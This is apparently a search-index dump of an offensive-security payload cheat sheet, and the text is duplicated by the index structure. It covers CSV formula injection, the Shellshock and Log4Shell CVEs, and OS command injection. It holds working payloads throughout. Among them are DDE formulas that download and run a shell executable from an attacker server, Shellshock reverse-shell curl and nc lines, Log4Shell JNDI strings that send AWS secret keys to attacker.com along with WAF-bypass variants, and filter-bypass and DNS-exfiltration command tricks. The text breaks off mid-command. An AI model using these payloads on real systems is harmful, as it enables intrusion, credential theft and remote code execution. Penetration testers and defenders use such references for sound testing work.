(CSRF attack) - Florian Courtial Hacking PayPal Accounts with one click (Patched) - Yasser Ali Add tweet to collection CSRF - vijay kumar Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd How i Hacked your Beats account ? Apple Bug Bounty - @aaditya_purani FORM POST JSON: JSON CSRF on POST Heartbeats API - Dr.Jones Hacking Facebook accounts using CSRF in Oculus-Facebook integration Cross site request forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019 Cross-Site Request Forgery Attack - PwnFunction Wiping Out CSRF - Joe Rozner - Oct 17, 2017 Bypass referer check logic for CSRF","title":"References"},{"location":"CSV%20Injection/","text":"CSV Injection (Formula Injection) Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed. Exploit Basic exploit with Dynamic Data Exchange # pop a calc DDE (\"cmd\";\"/C calc\";\"!A0\")A0 @SUM(1+1)*cmd|' /C calc'!A0 =2+5+cmd|' /C calc'!A0 # pop a notepad =cmd|' /C notepad'!'A1' # powershell download and execute =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0 # msf smb delivery with rundll32 =cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1 # Prefix obfuscation and command chaining =AAAA+BBBB-CCCC&\"Hello\"/12345&cmd|'/c calc.exe'!A =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A +thespanishinquisition(cmd|'/c calc.exe'!A = cmd|'/c calc.exe'!A # Using rundll32 instead of cmd =rundll32|'URL.dll,OpenURL calc.exe'!A =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A # Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed. = C m D | '/ c c al c . e x e ' ! A Technical Details of the above payload: cmd is the name the server can respond to whenever a client is trying to access the server /C calc is the file name which in our case is the calc(i.e the calc.exe) !A0 is the item name that specifies unit of data that a server can respond when the client is requesting the data Any formula can be started with = + \u2013 @ References OWASP - CSV Excel Macro Injection Google Bug Hunter University - CSV Excel formula injection CSV INJECTION: BASIC TO EXPLOIT!!!! - 30/11/2017 - Akansha Kesharwani From CSV to Meterpreter - 5th November 2015 - Adam Chester The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George Mauer Three New DDE Obfuscation Methods Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection","title":"CSV Injection (Formula Injection)"},{"location":"CSV%20Injection/#csv-injection-formula-injection","text":"Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.","title":"CSV Injection (Formula Injection)"},{"location":"CSV%20Injection/#exploit","text":"Basic exploit with Dynamic Data Exchange # pop a calc DDE (\"cmd\";\"/C calc\";\"!A0\")A0 @SUM(1+1)*cmd|' /C calc'!A0 =2+5+cmd|' /C calc'!A0 # pop a notepad =cmd|' /C notepad'!'A1' # powershell download and execute =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0 # msf smb delivery with rundll32 =cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1 # Prefix obfuscation and command chaining =AAAA+BBBB-CCCC&\"Hello\"/12345&cmd|'/c calc.exe'!A =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A +thespanishinquisition(cmd|'/c calc.exe'!A = cmd|'/c calc.exe'!A # Using rundll32 instead of cmd =rundll32|'URL.dll,OpenURL calc.exe'!A =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A # Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed. = C m D | '/ c c al c . e x e ' ! A Technical Details of the above payload: cmd is the name the server can respond to whenever a client is trying to access the server /C calc is the file name which in our case is the calc(i.e the calc.exe) !A0 is the item name that specifies unit of data that a server can respond when the client is requesting the data Any formula can be started with = + \u2013 @","title":"Exploit"},{"location":"CSV%20Injection/#references","text":"OWASP - CSV Excel Macro Injection Google Bug Hunter University - CSV Excel formula injection CSV INJECTION: BASIC TO EXPLOIT!!!! - 30/11/2017 - Akansha Kesharwani From CSV to Meterpreter - 5th November 2015 - Adam Chester The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George Mauer Three New DDE Obfuscation Methods Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection","title":"References"},{"location":"CVE%20Exploits/","text":"Common Vulnerabilities and Exposures Big CVEs in the last 5 years. CVE-2017-0144 - EternalBlue EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer. Afftected systems: - Windows Vista SP2 - Windows Server 2008 SP2 and R2 SP1 - Windows 7 SP1 - Windows 8.1 - Windows Server 2012 Gold and R2 - Windows RT 8.1 - Windows 10 Gold, 1511, and 1607 - Windows Server 2016 CVE-2017-5638 - Apache Struts 2 On March 6th, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This recent vulnerability, CVE-2017-5638, allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header. CVE-2018-7600 - Drupalgeddon 2 A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised. CVE-2019-0708 - BlueKeep A remote code execution vulnerability exists in Remote Desktop Services \u2013 formerly known as Terminal Services \u2013 when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. CVE-2019-19781 - Citrix ADC Netscaler A remote code execution vulnerability in Citrix Application Delivery Controller (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known as NetScaler Gateway that, if exploited, could allow an unauthenticated attacker to perform arbitrary code execution. Affected products: - Citrix ADC and Citrix Gateway version 13.0 all supported builds - Citrix ADC and NetScaler Gateway version 12.1 all supported builds - Citrix ADC and NetScaler Gateway version 12.0 all supported builds - Citrix ADC and NetScaler Gateway version 11.1 all supported builds - Citrix NetScaler ADC and NetScaler Gateway version 10.5 all supported builds Older, but not forgotten CVE-2014-0160 - Heartbleed The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs). CVE-2014-6271 - Shellshock Shellshock, also known as Bashdoor is a family of security bug in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system. echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\\r\\n\" curl --silent -k -H \"User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1\" \"https://10.0.0.1/cgi-bin/admin.cgi\" Thanks to Heartbleed - Official website Shellshock - Wikipedia Imperva Apache Struts analysis EternalBlue - Wikipedia BlueKeep - Microsoft","title":"Common Vulnerabilities and Exposures"},{"location":"CVE%20Exploits/#common-vulnerabilities-and-exposures","text":"","title":"Common Vulnerabilities and Exposures"},{"location":"CVE%20Exploits/#big-cves-in-the-last-5-years","text":"","title":"Big CVEs in the last 5 years."},{"location":"CVE%20Exploits/#cve-2017-0144-eternalblue","text":"EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer. Afftected systems: - Windows Vista SP2 - Windows Server 2008 SP2 and R2 SP1 - Windows 7 SP1 - Windows 8.1 - Windows Server 2012 Gold and R2 - Windows RT 8.1 - Windows 10 Gold, 1511, and 1607 - Windows Server 2016","title":"CVE-2017-0144 - EternalBlue"},{"location":"CVE%20Exploits/#cve-2017-5638-apache-struts-2","text":"On March 6th, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This recent vulnerability, CVE-2017-5638, allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header.","title":"CVE-2017-5638 - Apache Struts 2"},{"location":"CVE%20Exploits/#cve-2018-7600-drupalgeddon-2","text":"A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.","title":"CVE-2018-7600 - Drupalgeddon 2"},{"location":"CVE%20Exploits/#cve-2019-0708-bluekeep","text":"A remote code execution vulnerability exists in Remote Desktop Services \u2013 formerly known as Terminal Services \u2013 when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.","title":"CVE-2019-0708 - BlueKeep"},{"location":"CVE%20Exploits/#cve-2019-19781-citrix-adc-netscaler","text":"A remote code execution vulnerability in Citrix Application Delivery Controller (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known as NetScaler Gateway that, if exploited, could allow an unauthenticated attacker to perform arbitrary code execution. Affected products: - Citrix ADC and Citrix Gateway version 13.0 all supported builds - Citrix ADC and NetScaler Gateway version 12.1 all supported builds - Citrix ADC and NetScaler Gateway version 12.0 all supported builds - Citrix ADC and NetScaler Gateway version 11.1 all supported builds - Citrix NetScaler ADC and NetScaler Gateway version 10.5 all supported builds","title":"CVE-2019-19781 -  Citrix ADC Netscaler"},{"location":"CVE%20Exploits/#older-but-not-forgotten","text":"","title":"Older, but not forgotten"},{"location":"CVE%20Exploits/#cve-2014-0160-heartbleed","text":"The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).","title":"CVE-2014-0160 - Heartbleed"},{"location":"CVE%20Exploits/#cve-2014-6271-shellshock","text":"Shellshock, also known as Bashdoor is a family of security bug in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system. echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\\r\\n\" curl --silent -k -H \"User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1\" \"https://10.0.0.1/cgi-bin/admin.cgi\"","title":"CVE-2014-6271 - Shellshock"},{"location":"CVE%20Exploits/#thanks-to","text":"Heartbleed - Official website Shellshock - Wikipedia Imperva Apache Struts analysis EternalBlue - Wikipedia BlueKeep - Microsoft","title":"Thanks to"},{"location":"CVE%20Exploits/Log4Shell/","text":"CVE-2021-44228 Log4Shell Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled Summary Vulnerable code Payloads Scanning WAF Bypass Exploitation Environment variables exfiltration Remote Command Execution References Vulnerable code You can reproduce locally with: docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app using christophetd/log4shell-vulnerable-app or leonjza/log4jpwn public String index(@RequestHeader(\"X-Api-Version\") String apiVersion) { logger.info(\"Received a request for API version \" + apiVersion); return \"Hello, world!\"; } Payloads # Identify Java version and hostname ${jndi:ldap://${java:version}.domain/a} ${jndi:ldap://${env:JAVA_VERSION}.domain/a} ${jndi:ldap://${sys:java.version}.domain/a} ${jndi:ldap://${sys:java.vendor}.domain/a} ${jndi:ldap://${hostName}.domain/a} ${jndi:dns://${hostName}.domain} # More enumerations keywords and variables java:os docker:containerId web:rootDir bundle:config:db.password Scanning log4j-scan powershell usage: log4j-scan.py [-h] [-u URL] [-l USEDLIST] [--request-type REQUEST_TYPE] [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing] [--wait-time WAIT_TIME] [--waf-bypass] [--dns-callback-provider DNS_CALLBACK_PROVIDER] [--custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST] python3 log4j-scan.py -u http://127.0.0.1:8081 --run-all-test python3 log4j-scan.py -u http://127.0.0.1:808 --waf-bypass Nuclei Template WAF Bypass ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a} # using lower and upper ${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc} ${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc} ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce} # using env to create the letter ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a} ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a} Exploitation Environment variables exfiltration ${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/ # AWS Access Key ${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY} Remote Command Execution rogue-jndi - @artsploit ps1 java -jar target/RogueJndi-1.1.jar --command \"touch /tmp/toto\" --hostname \"192.168.1.21\" Mapping ldap://192.168.1.10:1389/ to artsploit.controllers.RemoteReference Mapping ldap://192.168.1.10:1389/o=reference to artsploit.controllers.RemoteReference Mapping ldap://192.168.1.10:1389/o=tomcat to artsploit.controllers.Tomcat Mapping ldap://192.168.1.10:1389/o=groovy to artsploit.controllers.Groovy Mapping ldap://192.168.1.10:1389/o=websphere1 to artsploit.controllers.WebSphere1 Mapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1 Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2 Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2 JNDI-Exploit-Kit - @pimps References Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package - December 12, 2021 Log4Shell Update: Second log4j Vulnerability Published (CVE-2021-44228 + CVE-2021-45046) - December 14, 2021 PSA: Log4Shell and the current state of JNDI injection - December 10, 2021","title":"CVE-2021-44228 Log4Shell"},{"location":"CVE%20Exploits/Log4Shell/#cve-2021-44228-log4shell","text":"Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled","title":"CVE-2021-44228 Log4Shell"},{"location":"CVE%20Exploits/Log4Shell/#summary","text":"Vulnerable code Payloads Scanning WAF Bypass Exploitation Environment variables exfiltration Remote Command Execution References","title":"Summary"},{"location":"CVE%20Exploits/Log4Shell/#vulnerable-code","text":"You can reproduce locally with: docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app using christophetd/log4shell-vulnerable-app or leonjza/log4jpwn public String index(@RequestHeader(\"X-Api-Version\") String apiVersion) { logger.info(\"Received a request for API version \" + apiVersion); return \"Hello, world!\"; }","title":"Vulnerable code"},{"location":"CVE%20Exploits/Log4Shell/#payloads","text":"# Identify Java version and hostname ${jndi:ldap://${java:version}.domain/a} ${jndi:ldap://${env:JAVA_VERSION}.domain/a} ${jndi:ldap://${sys:java.version}.domain/a} ${jndi:ldap://${sys:java.vendor}.domain/a} ${jndi:ldap://${hostName}.domain/a} ${jndi:dns://${hostName}.domain} # More enumerations keywords and variables java:os docker:containerId web:rootDir bundle:config:db.password","title":"Payloads"},{"location":"CVE%20Exploits/Log4Shell/#scanning","text":"log4j-scan powershell usage: log4j-scan.py [-h] [-u URL] [-l USEDLIST] [--request-type REQUEST_TYPE] [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing] [--wait-time WAIT_TIME] [--waf-bypass] [--dns-callback-provider DNS_CALLBACK_PROVIDER] [--custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST] python3 log4j-scan.py -u http://127.0.0.1:8081 --run-all-test python3 log4j-scan.py -u http://127.0.0.1:808 --waf-bypass Nuclei Template","title":"Scanning"},{"location":"CVE%20Exploits/Log4Shell/#waf-bypass","text":"${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a} # using lower and upper ${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc} ${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc} ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce} # using env to create the letter ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a} ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}","title":"WAF Bypass"},{"location":"CVE%20Exploits/Log4Shell/#exploitation","text":"","title":"Exploitation"},{"location":"CVE%20Exploits/Log4Shell/#environment-variables-exfiltration","text":"${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/ # AWS Access Key ${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}","title":"Environment variables exfiltration"},{"location":"CVE%20Exploits/Log4Shell/#remote-command-execution","text":"rogue-jndi - @artsploit ps1 java -jar target/RogueJndi-1.1.jar --command \"touch /tmp/toto\" --hostname \"192.168.1.21\" Mapping ldap://192.168.1.10:1389/ to artsploit.controllers.RemoteReference Mapping ldap://192.168.1.10:1389/o=reference to artsploit.controllers.RemoteReference Mapping ldap://192.168.1.10:1389/o=tomcat to artsploit.controllers.Tomcat Mapping ldap://192.168.1.10:1389/o=groovy to artsploit.controllers.Groovy Mapping ldap://192.168.1.10:1389/o=websphere1 to artsploit.controllers.WebSphere1 Mapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1 Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2 Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2 JNDI-Exploit-Kit - @pimps","title":"Remote Command Execution"},{"location":"CVE%20Exploits/Log4Shell/#references","text":"Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package - December 12, 2021 Log4Shell Update: Second log4j Vulnerability Published (CVE-2021-44228 + CVE-2021-45046) - December 14, 2021 PSA: Log4Shell and the current state of JNDI injection - December 10, 2021","title":"References"},{"location":"Command%20Injection/","text":"Command Injection Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application. Summary Tools Exploits Basic commands Chaining commands Inside a command Filter Bypasses Bypass without space Bypass with a line return Bypass characters filter via hex encoding Bypass blacklisted words Bypass with single quote Bypass with double quote Bypass with backslash and slash Bypass with $@ Bypass with $() Bypass with variable expansion Bypass with wildcards Challenge Time based data exfiltration DNS based data exfiltration Polyglot command injection References Tools commix - Automated All-in-One OS command injection and exploitation tool Exploits Basic commands Execute the command and voila :p cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh Chaining commands original_cmd_by_server; ls original_cmd_by_server && ls original_cmd_by_server | ls original_cmd_by_server || ls # Only if the first cmd fail Inside a command original_cmd_by_server `cat /etc/passwd` original_cmd_by_server $(cat /etc/passwd) Filter Bypasses Bypass without space Works on Linux only. swissky@crashlab:~/Www$ cat</etc/passwd root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ {cat,/etc/passwd} root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ cat$IFS/etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd RCE root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ X=$'uname\\x20-a'&&$X Linux crashlab 4.4.X-XX-generic #72-Ubuntu swissky@crashlab:~$ sh</dev/tcp/127.0.0.1/4242 Commands execution without spaces, $ or { } - Linux (Bash only) IFS=,;`cat<<<uname,-a` Tabs work as separators in web apps where spaces are removed. ;ls%09-al%09/home drwxr-xr-x 4 root root 4096 Jan 10 13:34 . drwxr-xr-x 18 root root 4096 Jan 10 13:33 .. drwx------ 2 root root 16384 Jan 10 13:31 lost+found drwxr-xr-x 4 test test 4096 Jan 13 08:30 test Works on Windows only. ping%CommonProgramFiles:~10,-18%IP ping%PROGRAMFILES:~10,-5%IP Bypass with a line return something%0Acat%20/etc/passwd You can also write files. ;cat>/tmp/hi<<EOF%0ahello%0aEOF ;cat</tmp/hi hello Bypass characters filter via hex encoding Linux swissky@crashlab:~$ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\" /etc/passwd swissky@crashlab:~$ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764 /etc/passwd swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764) /etc/passwd swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)` root:x:0:0:root:/root:/bin/bash Bypass characters filter Commands execution without backslash and slash - linux bash swissky@crashlab:~$ echo ${HOME:0:1} / swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ echo . | tr '!-0' '\"-1' / swissky@crashlab:~$ tr '!-0' '\"-1' <<< . / swissky@crashlab:~$ cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd root:x:0:0:root:/root:/bin/bash Bypass Blacklisted words Bypass with single quote w'h'o'am'i Bypass with double quote w\"h\"o\"am\"i Bypass with backslash and slash w\\ho\\am\\i /\\b\\i\\n/////s\\h Bypass with $@ who$@ami echo $0 -> /usr/bin/zsh echo whoami|$0 Bypass with $() who$()ami who$(echo am)i who`echo am`i Bypass with variable expansion /???/??t /???/p??s?? test=/ehhh/hmtc/pahhh/hmsswd cat ${test//hhh\\/hm/} cat ${test//hh??hm/} Bypass with wildcards powershell C:\\*\\*2\\n??e*d.*? # notepad @^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc Challenge Challenge based on the previous tricks, what does the following command do: g=\"/e\"\\h\"hh\"/hm\"t\"c/\\i\"sh\"hh/hmsu\\e;tac$@<${g//hh??hm/} Time based data exfiltration Extracting data : char by char swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi real 0m5.007s user 0m0.000s sys 0m0.000s swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi real 0m0.002s user 0m0.000s sys 0m0.000s DNS based data exfiltration Based on the tool from https://github.com/HoLyVieR/dnsbin also hosted at dnsbin.zhack.ca 1. Go to http://dnsbin.zhack.ca/ 2. Execute a simple 'ls' for i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done $(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il) Online tools to check for DNS based data exfiltration: dnsbin.zhack.ca pingb.in Polyglot command injection 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS} e.g: echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS} echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS} echo \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS} /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/ e.g: echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/ echo \"YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\" echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/' References SECURITY CAF\u00c9 - Exploiting Timed Based RCE Bug Bounty Survey - Windows RCE spaceless No PHP, no spaces, no $, no { }, bash only - @asdizzle #bash #obfuscation by string manipulation - Malwrologist, @DissectMalware","title":"Command Injection"},{"location":"Command%20Injection/#command-injection","text":"Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.","title":"Command Injection"},{"location":"Command%20Injection/#summary","text":"Tools Exploits Basic commands Chaining commands Inside a command Filter Bypasses Bypass without space Bypass with a line return Bypass characters filter via hex encoding Bypass blacklisted words Bypass with single quote Bypass with double quote Bypass with backslash and slash Bypass with $@ Bypass with $() Bypass with variable expansion Bypass with wildcards Challenge Time based data exfiltration DNS based data exfiltration Polyglot command injection References","title":"Summary"},{"location":"Command%20Injection/#tools","text":"commix - Automated All-in-One OS command injection and exploitation tool","title":"Tools"},{"location":"Command%20Injection/#exploits","text":"","title":"Exploits"},{"location":"Command%20Injection/#basic-commands","text":"Execute the command and voila :p cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh","title":"Basic commands"},{"location":"Command%20Injection/#chaining-commands","text":"original_cmd_by_server; ls original_cmd_by_server && ls original_cmd_by_server | ls original_cmd_by_server || ls # Only if the first cmd fail","title":"Chaining commands"},{"location":"Command%20Injection/#inside-a-command","text":"original_cmd_by_server `cat /etc/passwd` original_cmd_by_server $(cat /etc/passwd)","title":"Inside a command"},{"location":"Command%20Injection/#filter-bypasses","text":"","title":"Filter Bypasses"},{"location":"Command%20Injection/#bypass-without-space","text":"Works on Linux only. swissky@crashlab:~/Www$ cat</etc/passwd root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ {cat,/etc/passwd} root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ cat$IFS/etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd RCE root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ X=$'uname\\x20-a'&&$X Linux crashlab 4.4.X-XX-generic #72-Ubuntu swissky@crashlab:~$ sh</dev/tcp/127.0.0.1/4242 Commands execution without spaces, $ or { } - Linux (Bash only) IFS=,;`cat<<<uname,-a` Tabs work as separators in web apps where spaces are removed. ;ls%09-al%09/home drwxr-xr-x 4 root root 4096 Jan 10 13:34 . drwxr-xr-x 18 root root 4096 Jan 10 13:33 .. drwx------ 2 root root 16384 Jan 10 13:31 lost+found drwxr-xr-x 4 test test 4096 Jan 13 08:30 test Works on Windows only. ping%CommonProgramFiles:~10,-18%IP ping%PROGRAMFILES:~10,-5%IP","title":"Bypass without space"},{"location":"Command%20Injection/#bypass-with-a-line-return","text":"something%0Acat%20/etc/passwd You can also write files. ;cat>/tmp/hi<<EOF%0ahello%0aEOF ;cat</tmp/hi hello","title":"Bypass with a line return"},{"location":"Command%20Injection/#bypass-characters-filter-via-hex-encoding","text":"Linux swissky@crashlab:~$ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\" /etc/passwd swissky@crashlab:~$ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ `echo 